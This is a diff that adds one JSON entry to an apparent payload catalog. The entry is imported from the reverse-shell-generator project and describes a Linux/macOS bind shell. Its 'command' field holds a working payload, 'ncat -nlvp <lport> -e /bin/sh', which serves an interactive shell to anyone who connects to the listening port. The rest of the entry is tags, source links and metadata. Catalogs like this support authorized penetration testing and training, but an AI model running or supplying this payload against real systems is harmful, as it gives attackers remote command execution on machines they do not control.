@@ -1,0 +1,30 @@
+{
+  "id": "rsg-bindshell-ncat-e-bind",
+  "name": "RSG · BindShell · ncat -e Bind",
+  "command": "ncat -nlvp <lport> -e /bin/sh",
+  "description": "Bind Shell payload — ncat -e Bind (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "bind-shell",
+    "bind",
+    "mac",
+    "linux"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "BindShell/ncat -e Bind/77",
+  "category": "payloads",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
